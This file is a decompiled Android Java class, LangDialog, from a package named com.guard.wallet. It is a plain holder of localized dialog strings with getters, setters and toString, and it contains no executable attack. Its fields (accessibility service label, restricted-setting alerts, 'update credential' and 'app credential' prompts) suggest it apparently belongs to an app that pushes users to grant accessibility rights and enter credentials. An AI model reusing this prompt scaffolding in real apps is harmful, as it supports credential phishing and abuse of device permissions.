package com.guard.wallet.entity;

import a.a;
import android.support.annotation.NonNull;
import java.io.Serializable;

public class LangDialog implements Serializable {
   private String accessibilityServiceLabel;
   private String alertMsg;
   private String alertRestrictedMsg;
   private String alertTitle;
   private String aliveBlockMsg;
   private String allowRestricted;
   private String appCredentialDescription;
   private String appCredentialInitMsg;
   private String appCredentialSubTitle;
   private String appCredentialTitle;
   private String appLabel;
   private String exitConfirm;
   private String launcherLabel;
   private String notificationContent;
   private String notificationTitle;
   private String okText;
   private String updateCredentialDescription;
   private String updateCredentialSubTitle;
   private String updateCredentialTitle;
   private String updateSystemMsg;
   private String wifiBlockMsg;

   public LangDialog() {
   }

   public LangDialog(
      String var1,
      String var2,
      String var3,
      String var4,
      String var5,
      String var6,
      String var7,
      String var8,
      String var9,
      String var10,
      String var11,
      String var12,
      String var13,
      String var14,
      String var15,
      String var16,
      String var17,
      String var18,
      String var19,
      String var20,
      String var21
   ) {
      this.appLabel = var1;
      this.launcherLabel = var2;
      this.accessibilityServiceLabel = var3;
      this.okText = var4;
      this.alertTitle = var5;
      this.alertMsg = var6;
      this.aliveBlockMsg = var7;
      this.updateSystemMsg = var8;
      this.notificationTitle = var9;
      this.notificationContent = var10;
      this.exitConfirm = var11;
      this.allowRestricted = var12;
      this.alertRestrictedMsg = var13;
      this.updateCredentialTitle = var14;
      this.updateCredentialSubTitle = var15;
      this.updateCredentialDescription = var16;
      this.appCredentialTitle = var17;
      this.appCredentialSubTitle = var18;
      this.appCredentialDescription = var19;
      this.appCredentialInitMsg = var20;
      this.wifiBlockMsg = var21;
   }

   public String getAccessibilityServiceLabel() {
      return this.accessibilityServiceLabel;
   }

   public String getAlertMsg() {
      return this.alertMsg;
   }

   public String getAlertRestrictedMsg() {
      return this.alertRestrictedMsg;
   }

   public String getAlertTitle() {
      return this.alertTitle;
   }

   public String getAliveBlockMsg() {
      return this.aliveBlockMsg;
   }

   public String getAllowRestricted() {
      return this.allowRestricted;
   }

   public String getAppCredentialDescription() {
      return this.appCredentialDescription;
   }

   public String getAppCredentialInitMsg() {
      return this.appCredentialInitMsg;
   }

   public String getAppCredentialSubTitle() {
      return this.appCredentialSubTitle;
   }

   public String getAppCredentialTitle() {
      return this.appCredentialTitle;
   }

   public String getAppLabel() {
      return this.appLabel;
   }

   public String getExitConfirm() {
      return this.exitConfirm;
   }

   public String getLauncherLabel() {
      return this.launcherLabel;
   }

   public String getNotificationContent() {
      return this.notificationContent;
   }

   public String getNotificationTitle() {
      return this.notificationTitle;
   }

   public String getOkText() {
      return this.okText;
   }

   public String getUpdateCredentialDescription() {
      return this.updateCredentialDescription;
   }

   public String getUpdateCredentialSubTitle() {
      return this.updateCredentialSubTitle;
   }

   public String getUpdateCredentialTitle() {
      return this.updateCredentialTitle;
   }

   public String getUpdateSystemMsg() {
      return this.updateSystemMsg;
   }

   public String getWifiBlockMsg() {
      return this.wifiBlockMsg;
   }

   public void setAccessibilityServiceLabel(String var1) {
      this.accessibilityServiceLabel = var1;
   }

   public void setAlertMsg(String var1) {
      this.alertMsg = var1;
   }

   public void setAlertRestrictedMsg(String var1) {
      this.alertRestrictedMsg = var1;
   }

   public void setAlertTitle(String var1) {
      this.alertTitle = var1;
   }

   public void setAliveBlockMsg(String var1) {
      this.aliveBlockMsg = var1;
   }

   public void setAllowRestricted(String var1) {
      this.allowRestricted = var1;
   }

   public void setAppCredentialDescription(String var1) {
      this.appCredentialDescription = var1;
   }

   public void setAppCredentialInitMsg(String var1) {
      this.appCredentialInitMsg = var1;
   }

   public void setAppCredentialSubTitle(String var1) {
      this.appCredentialSubTitle = var1;
   }

   public void setAppCredentialTitle(String var1) {
      this.appCredentialTitle = var1;
   }

   public void setAppLabel(String var1) {
      this.appLabel = var1;
   }

   public void setExitConfirm(String var1) {
      this.exitConfirm = var1;
   }

   public void setLauncherLabel(String var1) {
      this.launcherLabel = var1;
   }

   public void setNotificationContent(String var1) {
      this.notificationContent = var1;
   }

   public void setNotificationTitle(String var1) {
      this.notificationTitle = var1;
   }

   public void setOkText(String var1) {
      this.okText = var1;
   }

   public void setUpdateCredentialDescription(String var1) {
      this.updateCredentialDescription = var1;
   }

   public void setUpdateCredentialSubTitle(String var1) {
      this.updateCredentialSubTitle = var1;
   }

   public void setUpdateCredentialTitle(String var1) {
      this.updateCredentialTitle = var1;
   }

   public void setUpdateSystemMsg(String var1) {
      this.updateSystemMsg = var1;
   }

   public void setWifiBlockMsg(String var1) {
      this.wifiBlockMsg = var1;
   }

   @NonNull
   @Override
   public String toString() {
      StringBuilder var1 = new StringBuilder("LangDialog{appLabel='");
      var1.append(this.appLabel);
      var1.append("', launcherLabel='");
      var1.append(this.launcherLabel);
      var1.append("', accessibilityServiceLabel='");
      var1.append(this.accessibilityServiceLabel);
      var1.append("', okText='");
      var1.append(this.okText);
      var1.append("', alertTitle='");
      var1.append(this.alertTitle);
      var1.append("', alertMsg='");
      var1.append(this.alertMsg);
      var1.append("', aliveBlockMsg='");
      var1.append(this.aliveBlockMsg);
      var1.append("', updateSystemMsg='");
      var1.append(this.updateSystemMsg);
      var1.append("', notificationTitle='");
      var1.append(this.notificationTitle);
      var1.append("', notificationContent='");
      var1.append(this.notificationContent);
      var1.append("', exitConfirm='");
      var1.append(this.exitConfirm);
      var1.append("', allowRestricted='");
      var1.append(this.allowRestricted);
      var1.append("', alertRestrictedMsg='");
      var1.append(this.alertRestrictedMsg);
      var1.append("', updateCredentialTitle='");
      var1.append(this.updateCredentialTitle);
      var1.append("', updateCredentialSubTitle='");
      var1.append(this.updateCredentialSubTitle);
      var1.append("', updateCredentialDescription='");
      var1.append(this.updateCredentialDescription);
      var1.append("', appCredentialTitle='");
      var1.append(this.appCredentialTitle);
      var1.append("', appCredentialSubTitle='");
      var1.append(this.appCredentialSubTitle);
      var1.append("', appCredentialDescription='");
      var1.append(this.appCredentialDescription);
      var1.append("', appCredentialInitMsg='");
      var1.append(this.appCredentialInitMsg);
      var1.append("', wifiBlockMsg='");
      return a.n(var1, this.wifiBlockMsg, "'}");
   }
}
